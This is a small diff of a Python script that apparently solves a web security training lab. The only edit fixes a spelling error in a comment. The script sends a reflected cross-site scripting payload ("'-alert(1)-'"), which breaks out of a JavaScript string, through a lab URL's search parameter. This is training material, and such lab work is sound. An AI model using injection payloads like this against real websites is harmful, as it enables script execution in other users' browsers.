@@ -16,7 +16,7 @@ import requests
 
 
 lab_id = '0af500f003073478a4a1985000140040' #change based on generated lab
-payload = "'-alert(1)-'" # search paramter will get injected into the searchTerms string
+payload = "'-alert(1)-'" # search parameter will get injected into the searchTerms string
 uri = f"https://{lab_id}.web-security-academy.net/?search={payload}" 
 
 r = requests.get(uri)
